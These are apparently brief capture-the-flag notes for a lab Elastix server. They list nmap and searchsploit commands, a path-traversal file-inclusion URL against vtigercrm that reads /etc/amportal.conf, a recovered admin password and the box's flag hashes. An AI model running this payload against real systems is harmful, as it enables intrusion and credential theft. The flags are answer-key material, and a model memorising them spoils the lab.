furious 10.10.10.7
> 4559,25,3306,80,4190,10000,111,995,110,143,22,4445,443,993,%                                                                                                              

nmap -sC -sV -p4559,25,3306,80,4190,10000,111,995,110,143,22,4445,443,993 -Pn -n 10.10.10.7 -oN targeted

# 80
searchsploit elastix

## LFI
searchsploit -x php/webapps/37637.pl

https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

### searching for users
user: admin
password: jEhdIekWmdjE

## flags

user: aeff3def0c765c2677b94715cffa73ac
root: d88e006123842106982acce0aaf453f0
